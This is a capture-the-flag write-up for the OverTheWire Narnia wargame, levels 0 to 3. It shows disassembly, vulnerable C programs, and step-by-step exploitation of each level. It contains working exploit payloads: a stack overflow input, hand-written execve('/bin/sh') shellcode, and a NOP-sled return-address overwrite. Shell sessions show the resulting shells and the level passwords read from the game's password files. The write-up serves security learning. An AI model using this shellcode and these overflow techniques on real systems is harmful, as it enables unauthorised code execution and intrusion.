Game Site: narnia.labs.overthewire.org  

# Level 0

User: narnia0  
Pass: narnia0  

## Disassembly

    080484c4 <main>:
     80484c4:       55                      push   %ebp
     80484c5:       89 e5                   mov    %esp,%ebp
     80484c7:       83 e4 f0                and    $0xfffffff0,%esp
     80484ca:       83 ec 30                sub    $0x30,%esp
     80484cd:       c7 44 24 2c 41 41 41    movl   $0x41414141,0x2c(%esp)
     80484d4:       41 
     80484d5:       c7 04 24 40 86 04 08    movl   $0x8048640,(%esp)
     80484dc:       e8 cf fe ff ff          call   80483b0 <puts@plt>
     80484e1:       b8 73 86 04 08          mov    $0x8048673,%eax
     80484e6:       89 04 24                mov    %eax,(%esp)
     80484e9:       e8 b2 fe ff ff          call   80483a0 <printf@plt>
     80484ee:       b8 89 86 04 08          mov    $0x8048689,%eax
     80484f3:       8d 54 24 18             lea    0x18(%esp),%edx
     80484f7:       89 54 24 04             mov    %edx,0x4(%esp)
     80484fb:       89 04 24                mov    %eax,(%esp)
     80484fe:       e8 fd fe ff ff          call   8048400 <__isoc99_scanf@plt>
     8048503:       b8 8e 86 04 08          mov    $0x804868e,%eax
     8048508:       8d 54 24 18             lea    0x18(%esp),%edx
     804850c:       89 54 24 04             mov    %edx,0x4(%esp)
     8048510:       89 04 24                mov    %eax,(%esp)
     8048513:       e8 88 fe ff ff          call   80483a0 <printf@plt>
     8048518:       b8 97 86 04 08          mov    $0x8048697,%eax
     804851d:       8b 54 24 2c             mov    0x2c(%esp),%edx
     8048521:       89 54 24 04             mov    %edx,0x4(%esp)
     8048525:       89 04 24                mov    %eax,(%esp)
     8048528:       e8 73 fe ff ff          call   80483a0 <printf@plt>
     804852d:       81 7c 24 2c ef be ad    cmpl   $0xdeadbeef,0x2c(%esp)
     8048534:       de 
     8048535:       75 13                   jne    804854a <main+0x86>
     8048537:       c7 04 24 a4 86 04 08    movl   $0x80486a4,(%esp)
     804853e:       e8 7d fe ff ff          call   80483c0 <system@plt>
     8048543:       b8 00 00 00 00          mov    $0x0,%eax
     8048548:       c9                      leave  
     8048549:       c3                      ret    
     804854a:       c7 04 24 ac 86 04 08    movl   $0x80486ac,(%esp)
     8048551:       e8 5a fe ff ff          call   80483b0 <puts@plt>
     8048556:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
     804855d:       e8 7e fe ff ff          call   80483e0 <exit@plt>

## Source Code

    /*
        This program is free software; you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation; either version 2 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
    */
    #include <stdio.h>
    #include <stdlib.h>

    int main(){
      long val=0x41414141;
      char buf[20];

      printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
      printf("Here is your chance: ");
      scanf("%24s",&buf);

      printf("buf: %s\n",buf);
      printf("val: 0x%08x\n",val);

      if(val==0xdeadbeef)
        system("/bin/sh");
      else {
        printf("WAY OFF!!!!\n");
        exit(1);
      }

      return 0;
    }

## Notes

Upon first seeing this level I started with disassembling the code to try and identify what type of vulnerability 
we're dealing with (yes, I know the source code was given too).  At offset `0x080484cd` we see that our target 
value of `0x41414141` is saved on the stack at offset `0x2c`.  Then at `0x080484f3` we see the address of our 
buffer (stored on the stack at offset `0x18`) is loaded into `%edx` which is then passed to a `scaf()` call.  A 
quick bit of math, `0x2c - 0x18`, tells us that the buffer used to store our input is 20 bytes and we also know 
that our target is stored just above our buffer.  Intuition tells us that this is a stack buffer overflow.

Running the program with the a test string of 20 A's followed by 4 B's shows that we can in fact overwrite 
the target variable.

    narnia0@melinda:/narnia$ ./narnia0  
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
    buf: AAAAAAAAAAAAAAAAAAAABBBB
    val: 0x42424242
    WAY OFF!!!!
    narnia0@melinda:/narnia$

Now we just need to get the desired value of `0xdeadbeef` in there.  I don't know why, but initially I thought it 
would be just a matter of escaping the bytes as I typed them in, like so:

    narnia0@melinda:/narnia$ ./narnia0
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde
    buf: AAAAAAAAAAAAAAAAAAAA\xef
    val: 0x6665785c
    WAY OFF!!!!
    narnia0@melinda:/narnia$

As you can see, this is clearly not the case.  This does not work because the `%s` format string used in `scanf()` 
interprets each character typed as a single byte, there is no interpretation of the string done.  Once I realized 
this it was a matter of constructing our string outside of the program and passing it in.  We can do this with 
Python like so:

    narnia0@melinda:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0 
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
    val: 0xdeadbeef
    narnia0@melinda:/narnia$

Fantastic! We set the value, but where's our promised shell? Running our code again with `ltrace` we see that 
the shell is closed immediately.

    narnia0@melinda:/narnia$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ltrace ./narnia0 
    __libc_start_main(0x80484c4, 1, -10268, 0x8048570, 0x80485e0 <unfinished ...>
    puts("Correct val's value from 0x41414"...Correct val's value from 0x41414141 -> 0xdeadbeef!
    )                                                                                         = 51
    printf("Here is your chance: ")                                                                                                     = 21
    __isoc99_scanf(0x8048689, -10456, 0x8049ff4, 0x8048591, -1)                                                                         = 1
    printf("buf: %s\n", "AAAAAAAAAAAAAAAAAAAA\357\276\255\336"Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
    )                                                                         = 30
    printf("val: 0x%08x\n", 0xdeadbeefval: 0xdeadbeef
    )                                                                                                 = 16
    system("/bin/sh" <unfinished ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                                                                              = 0
    +++ exited (status 0) +++
    narnia0@melinda:/narnia$

In order to keep our shell open we need to also pass in something that will force the shell to wait for us.  After 
a bit of playing around it seems that `cat` is our way in.

    narnia0@melinda:/narnia$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat) | ./narnia0
    Correct val's value from 0x41414141 -> 0xdeadbeef!
    Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
    val: 0xdeadbeef
    whoami
    narnia1
    cat /etc/narnia_pass/narnia1
    efeidiedae
    ^C
    narnia0@melinda:/narnia$

And now we have the password to the next level.

## Concepts From This Level

- Stack buffer overflow
- Pass input generated from Python
- Use of `cat` to force the shell to wait

# Level 1

User: narnia1  
Pass: efeidiedae  

## Disassembly

    08048434 <main>:
     8048434:       55                      push   %ebp
     8048435:       89 e5                   mov    %esp,%ebp
     8048437:       83 e4 f0                and    $0xfffffff0,%esp
     804843a:       83 ec 20                sub    $0x20,%esp
     804843d:       c7 04 24 60 85 04 08    movl   $0x8048560,(%esp)
     8048444:       e8 e7 fe ff ff          call   8048330 <getenv@plt>
     8048449:       85 c0                   test   %eax,%eax
     804844b:       75 18                   jne    8048465 <main+0x31>
     804844d:       c7 04 24 64 85 04 08    movl   $0x8048564,(%esp)
     8048454:       e8 e7 fe ff ff          call   8048340 <puts@plt>
     8048459:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
     8048460:       e8 fb fe ff ff          call   8048360 <exit@plt>
     8048465:       c7 04 24 99 85 04 08    movl   $0x8048599,(%esp)
     804846c:       e8 cf fe ff ff          call   8048340 <puts@plt>
     8048471:       c7 04 24 60 85 04 08    movl   $0x8048560,(%esp)
     8048478:       e8 b3 fe ff ff          call   8048330 <getenv@plt>
     804847d:       89 44 24 1c             mov    %eax,0x1c(%esp)
     8048481:       8b 44 24 1c             mov    0x1c(%esp),%eax
     8048485:       ff d0                   call   *%eax
     8048487:       b8 00 00 00 00          mov    $0x0,%eax
     804848c:       c9                      leave  
     804848d:       c3                      ret
     
## Source Code

    #include <stdio.h>

    int main(){
      int (*ret)();

      if(getenv("EGG")==NULL){    
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
      }

      printf("Trying to execute EGG!\n");
      ret = getenv("EGG");
      ret();

      return 0;
    }
    
## Notes

The idea in this level is to exploit the program through the environment variable `EGG`.  Looking at the 
disassembly we see these few instructions:

    8048471:       c7 04 24 60 85 04 08    movl   $0x8048560,(%esp)
    8048478:       e8 b3 fe ff ff          call   8048330 <getenv@plt>
    804847d:       89 44 24 1c             mov    %eax,0x1c(%esp)
    8048481:       8b 44 24 1c             mov    0x1c(%esp),%eax
    8048485:       ff d0                   call   *%eax

The program calls `getenv()`, then (pointlessly) puts the result on the stack just to retrieve it, followed by 
trying to execute the code pointed to by the address in `%eax`.  Since `getenv()` returns a pointer to the string 
stored in the environment variable, it follows that if we put some shellcode into `EGG` the program will happily 
execute it for us. How kind.

Rather than heading over to a site like [shell-storm](http://shell-storm.org/), I decided to write my own 
shellcode.  To do this, you first want to figure out what your shell code should do.  In our case it'd be really 
handy if ours gave us a shell to work with so we're going to run `/bin/sh` in our current address space.

My first iteration of code was the following.

    .text
    .code32
    .globl _start
    
    _start:
        movl    $path, %ebx
        movl    $argp, %ecx
        movl    $0x00, %edx
        movl    $0x0b, %eax
        int     $0x80
    
    .data
    path:       .asciz "/bin/sh"
    argp:       .long   path, 0x0

Unfortunately, while this will do what we want, it won't work as shellcode.  This is because in shellcode we don't 
have the ability to refer to addresses in a "data" section and we can't have any NUL bytes in our string.  If we 
rework the shellcode, we can come up with something like this:

    .text
    .code32
    .globl _start
    
    _start:
        xorl    %eax, %eax
        pushl   %eax
        pushl   $0x68732f2f
        pushl   $0x6e69622f
        movl    %esp, %ebx
        pushl   %eax
        pushl   %esp
        movl    %esp, %ecx
        movl    %eax, %edx
        movb    $0x0b, %al
        int     $0x80

When this is assembled, it generates the following shellcode:

    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

Which we can then use to exploit the `narnia` program.

    narnia1@melinda:~$ export EGG=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
    narnia1@melinda:~$ /narnia/narnia1
    Trying to execute EGG!
    $ cat /etc/narnia_pass/narnia2
    nairiepecu
    $ exit
    narnia1@melinda:~$

Giving us the password for the `narnia2` account.

# Level 2

User: narnia2  
Pass: nairiepecu  

## Disassembly

    08048424 <main>:
     8048424:       55                      push   %ebp
     8048425:       89 e5                   mov    %esp,%ebp
     8048427:       83 e4 f0                and    $0xfffffff0,%esp
     804842a:       81 ec 90 00 00 00       sub    $0x90,%esp
     8048430:       83 7d 08 01             cmpl   $0x1,0x8(%ebp)
     8048434:       75 22                   jne    8048458 <main+0x34>
     8048436:       8b 45 0c                mov    0xc(%ebp),%eax
     8048439:       8b 10                   mov    (%eax),%edx
     804843b:       b8 60 85 04 08          mov    $0x8048560,%eax
     8048440:       89 54 24 04             mov    %edx,0x4(%esp)
     8048444:       89 04 24                mov    %eax,(%esp)
     8048447:       e8 d4 fe ff ff          call   8048320 <printf@plt>
     804844c:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
     8048453:       e8 f8 fe ff ff          call   8048350 <exit@plt>
     8048458:       8b 45 0c                mov    0xc(%ebp),%eax
     804845b:       83 c0 04                add    $0x4,%eax
     804845e:       8b 00                   mov    (%eax),%eax
     8048460:       89 44 24 04             mov    %eax,0x4(%esp)
     8048464:       8d 44 24 10             lea    0x10(%esp),%eax
     8048468:       89 04 24                mov    %eax,(%esp)
     804846b:       e8 c0 fe ff ff          call   8048330 <strcpy@plt>
     8048470:       b8 74 85 04 08          mov    $0x8048574,%eax
     8048475:       8d 54 24 10             lea    0x10(%esp),%edx
     8048479:       89 54 24 04             mov    %edx,0x4(%esp)
     804847d:       89 04 24                mov    %eax,(%esp)
     8048480:       e8 9b fe ff ff          call   8048320 <printf@plt>
     8048485:       b8 00 00 00 00          mov    $0x0,%eax
     804848a:       c9                      leave  
     804848b:       c3                      ret

## Source Code

    /*
        This program is free software; you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation; either version 2 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
    */
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    int main(int argc, char * argv[]){
      char buf[128];

      if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
      }
      strcpy(buf,argv[1]);
      printf("%s", buf);

      return 0;
    }

## Notes

Starting with the disassembly, we quickly see that the `narnia2` program uses `strcpy()` to store a string passed 
in by the user to a buffer on the stack without checking the string length.  This means we can take control of 
`%eip` by overwriting the return address of `main()`.  Looking at the disassembly we see that the buffer being 
used is 140 bytes long and we know that the return address is 4 bytes beyond that.

We can verify this by doing the following:

    narnia2@melinda:~$ gdb -q /narnia/narnia2
    Reading symbols from /games/narnia/narnia2...(no debugging symbols found)...done.
    (gdb) r `python -c 'print "A"*140 + "C"*4'`
    Starting program: /games/narnia/narnia2 `python -c 'print "A"*140 + "C"*4'`

    Program received signal SIGSEGV, Segmentation fault.
    0x43434343 in ?? ()
    (gdb) 

Looking at the stack, we can clearly see where our A's are located and the four C's that follow.
  
    (gdb) x /200x $esp
    0xffffd6a0:	0x00000000	0xffffd734	0xffffd740	0xf7fd2000
    0xffffd6b0:	0x00000000	0xffffd71c	0xffffd740	0x00000000
    0xffffd6c0:	0x0804821c	0xf7fcdff4	0x00000000	0x00000000
    0xffffd6d0:	0x00000000	0xf65bbd48	0xc19ff958	0x00000000
    0xffffd6e0:	0x00000000	0x00000000	0x00000002	0x08048370
    0xffffd6f0:	0x00000000	0xf7ff0a90	0xf7e433d9	0xf7ffcff4
    0xffffd700:	0x00000002	0x08048370	0x00000000	0x08048391
    0xffffd710:	0x08048424	0x00000002	0xffffd734	0x08048490
    0xffffd720:	0x08048500	0xf7feb660	0xffffd72c	0xf7ffd918
    0xffffd730:	0x00000002	0xffffd85f	0xffffd875	0x00000000
    0xffffd740:	0xffffd906	0xffffd916	0xffffd921	0xffffd941
    0xffffd750:	0xffffd955	0xffffd95e	0xffffd96b	0xffffde8c
    0xffffd760:	0xffffde97	0xffffdea3	0xffffdef0	0xffffdf07
    0xffffd770:	0xffffdf16	0xffffdf28	0xffffdf39	0xffffdf42
    0xffffd780:	0xffffdf55	0xffffdf5d	0xffffdf6d	0xffffdfa0
    0xffffd790:	0xffffdfc0	0x00000000	0x00000020	0xf7fdb420
    0xffffd7a0:	0x00000021	0xf7fdb000	0x00000010	0x1f898b75
    0xffffd7b0:	0x00000006	0x00001000	0x00000011	0x00000064
    0xffffd7c0:	0x00000003	0x08048034	0x00000004	0x00000020
    0xffffd7d0:	0x00000005	0x00000008	0x00000007	0xf7fdc000
    0xffffd7e0:	0x00000008	0x00000000	0x00000009	0x08048370
    0xffffd7f0:	0x0000000b	0x000036b2	0x0000000c	0x000036b2
    0xffffd800:	0x0000000d	0x000036b2	0x0000000e	0x000036b2
    0xffffd810:	0x00000017	0x00000000	0x00000019	0xffffd83b
    0xffffd820:	0x0000001f	0xffffdfe2	0x0000000f	0xffffd84b
    0xffffd830:	0x00000000	0x00000000	0x42000000	0x7e88703d
    0xffffd840:	0x3e5b84fb	0x4250d582	0x69870f8a	0x00363836
    0xffffd850:	0x00000000	0x00000000	0x00000000	0x2f000000
    0xffffd860:	0x656d6167	0x616e2f73	0x61696e72	0x72616e2f
    0xffffd870:	0x3261696e	0x41414100	0x41414141	0x41414141
    0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd8b0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd8c0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd8d0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd8e0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd8f0:	0x41414141	0x41414141	0x41414141	0x41414141
    0xffffd900:	0x43434341	0x48530043	0x3d4c4c45	0x6e69622f
    0xffffd910:	0x7361622f	0x45540068	0x783d4d52	0x6d726574
    0xffffd920:	0x48535300	0x494c435f	0x3d544e45	0x352e3639
    0xffffd930:	0x31382e30	0x2034352e	0x32303135	0x32322032
    0xffffd940:	0x48535300	0x5954545f	0x65642f3d	0x74702f76
    0xffffd950:	0x33332f73	0x5f434c00	0x3d4c4c41	0x53550043
    0xffffd960:	0x6e3d5245	0x696e7261	0x4c003261	0x4f435f53
    0xffffd970:	0x53524f4c	0x3d73723d	0x69643a30	0x3b31303d
    0xffffd980:	0x6c3a3433	0x31303d6e	0x3a36333b	0x303d686d
    0xffffd990:	0x69703a30	0x3b30343d	0x733a3333	0x31303d6f
    0xffffd9a0:	0x3a35333b	0x303d6f64	0x35333b31	0x3d64623a
    0xffffd9b0:	0x333b3034	0x31303b33	0x3d64633a	0x333b3034
    (gdb)

The goal now is to put our shellcode into the buffer and then execute it.  Since we need to fill the whole buffer 
and our shellcode is only 25 bytes long we will prepend NOP's to the shellcode as a sled.  Looking back at our 
dump of the stack we can pick any address in the sled, I happened to choose `0xffffd8c0`.  At this point all that 
needs to happen is pass our shellcode in with the address in the sled and run the program.

    narnia2@melinda:~$ /narnia/narnia2 `python -c 'print "\x90"*115 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xc0\xd8\xff\xff"'`
    $ whoami
    narnia3
    $ cat /etc/narnia_pass/narnia3
    vaequeezee
    $ exit
    narnia2@melinda:~$

We know have the password for the next level.

# Level 3

User: narnia3  
Pass: vaequeezee  

## Disassembly

    080484d4 <main>:
     80484d4:	55                   	push   %ebp
     80484d5:	89 e5                	mov    %esp,%ebp
     80484d7:	83 e4 f0             	and    $0xfffffff0,%esp
     80484da:	83 ec 70             	sub    $0x70,%esp
     80484dd:	c7 44 24 58 2f 64 65 	movl   $0x7665642f,0x58(%esp)
     80484e4:	76 
     80484e5:	c7 44 24 5c 2f 6e 75 	movl   $0x6c756e2f,0x5c(%esp)
     80484ec:	6c 
     80484ed:	c7 44 24 60 6c 00 00 	movl   $0x6c,0x60(%esp)
     80484f4:	00 
     80484f5:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%esp)
     80484fc:	00 
     80484fd:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
     8048501:	74 22                	je     8048525 <main+0x51>
     8048503:	8b 45 0c             	mov    0xc(%ebp),%eax
     8048506:	8b 10                	mov    (%eax),%edx
     8048508:	b8 10 87 04 08       	mov    $0x8048710,%eax
     804850d:	89 54 24 04          	mov    %edx,0x4(%esp)
     8048511:	89 04 24             	mov    %eax,(%esp)
     8048514:	e8 87 fe ff ff       	call   80483a0 <printf@plt>
     8048519:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
     8048520:	e8 ab fe ff ff       	call   80483d0 <exit@plt>
     8048525:	8b 45 0c             	mov    0xc(%ebp),%eax
     8048528:	83 c0 04             	add    $0x4,%eax
     804852b:	8b 00                	mov    (%eax),%eax
     804852d:	89 44 24 04          	mov    %eax,0x4(%esp)
     8048531:	8d 44 24 38          	lea    0x38(%esp),%eax
     8048535:	89 04 24             	mov    %eax,(%esp)
     8048538:	e8 73 fe ff ff       	call   80483b0 <strcpy@plt>
     804853d:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
     8048544:	00 
     8048545:	8d 44 24 58          	lea    0x58(%esp),%eax
     8048549:	89 04 24             	mov    %eax,(%esp)
     804854c:	e8 8f fe ff ff       	call   80483e0 <open@plt>
     8048551:	89 44 24 6c          	mov    %eax,0x6c(%esp)
     8048555:	83 7c 24 6c 00       	cmpl   $0x0,0x6c(%esp)
     804855a:	79 21                	jns    804857d <main+0xa9>
     804855c:	b8 48 87 04 08       	mov    $0x8048748,%eax
     8048561:	8d 54 24 58          	lea    0x58(%esp),%edx
     8048565:	89 54 24 04          	mov    %edx,0x4(%esp)
     8048569:	89 04 24             	mov    %eax,(%esp)
     804856c:	e8 2f fe ff ff       	call   80483a0 <printf@plt>
     8048571:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
     8048578:	e8 53 fe ff ff       	call   80483d0 <exit@plt>
     804857d:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
     8048584:	00 
     8048585:	8d 44 24 38          	lea    0x38(%esp),%eax
     8048589:	89 04 24             	mov    %eax,(%esp)
     804858c:	e8 4f fe ff ff       	call   80483e0 <open@plt>
     8048591:	89 44 24 68          	mov    %eax,0x68(%esp)
     8048595:	83 7c 24 68 00       	cmpl   $0x0,0x68(%esp)
     804859a:	79 21                	jns    80485bd <main+0xe9>
     804859c:	b8 48 87 04 08       	mov    $0x8048748,%eax
     80485a1:	8d 54 24 38          	lea    0x38(%esp),%edx
     80485a5:	89 54 24 04          	mov    %edx,0x4(%esp)
     80485a9:	89 04 24             	mov    %eax,(%esp)
     80485ac:	e8 ef fd ff ff       	call   80483a0 <printf@plt>
     80485b1:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
     80485b8:	e8 13 fe ff ff       	call   80483d0 <exit@plt>
     80485bd:	c7 44 24 08 1f 00 00 	movl   $0x1f,0x8(%esp)
     80485c4:	00 
     80485c5:	8d 44 24 18          	lea    0x18(%esp),%eax
     80485c9:	89 44 24 04          	mov    %eax,0x4(%esp)
     80485cd:	8b 44 24 68          	mov    0x68(%esp),%eax
     80485d1:	89 04 24             	mov    %eax,(%esp)
     80485d4:	e8 b7 fd ff ff       	call   8048390 <read@plt>
     80485d9:	c7 44 24 08 1f 00 00 	movl   $0x1f,0x8(%esp)
     80485e0:	00 
     80485e1:	8d 44 24 18          	lea    0x18(%esp),%eax
     80485e5:	89 44 24 04          	mov    %eax,0x4(%esp)
     80485e9:	8b 44 24 6c          	mov    0x6c(%esp),%eax
     80485ed:	89 04 24             	mov    %eax,(%esp)
     80485f0:	e8 0b fe ff ff       	call   8048400 <write@plt>
     80485f5:	b8 5c 87 04 08       	mov    $0x804875c,%eax
     80485fa:	8d 54 24 58          	lea    0x58(%esp),%edx
     80485fe:	89 54 24 08          	mov    %edx,0x8(%esp)
     8048602:	8d 54 24 38          	lea    0x38(%esp),%edx
     8048606:	89 54 24 04          	mov    %edx,0x4(%esp)
     804860a:	89 04 24             	mov    %eax,(%esp)
     804860d:	e8 8e fd ff ff       	call   80483a0 <printf@plt>
     8048612:	8b 44 24 68          	mov    0x68(%esp),%eax
     8048616:	89 04 24             	mov    %eax,(%esp)
     8048619:	e8 f2 fd ff ff       	call   8048410 <close@plt>
     804861e:	8b 44 24 6c          	mov    0x6c(%esp),%eax
     8048622:	89 04 24             	mov    %eax,(%esp)
     8048625:	e8 e6 fd ff ff       	call   8048410 <close@plt>
     804862a:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
     8048631:	e8 9a fd ff ff       	call   80483d0 <exit@plt>

## Source Code

    /*
        This program is free software; you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation; either version 2 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
    */
    #include <stdio.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <string.h> 

    int main(int argc, char **argv){
 
            int  ifd,  ofd;
            char ofile[16] = "/dev/null";
            char ifile[32];
            char buf[32];
 
            if(argc != 2){
                    printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                    exit(-1);
            }
 
            /* open files */
            strcpy(ifile, argv[1]);
            if((ofd = open(ofile,O_RDWR)) < 0 ){
                    printf("error opening %s\n", ofile);
                    exit(-1);
            }
            if((ifd = open(ifile, O_RDONLY)) < 0 ){
                    printf("error opening %s\n", ifile);
                    exit(-1);
            }
 
            /* copy from file1 to file2 */
            read(ifd, buf, sizeof(buf)-1);
            write(ofd,buf, sizeof(buf)-1);
            printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
 
            /* close 'em */
            close(ifd);
            close(ofd);
 
            exit(1);
    }

## Notes

Need to place path to file I control on stack in place of /dev/null.
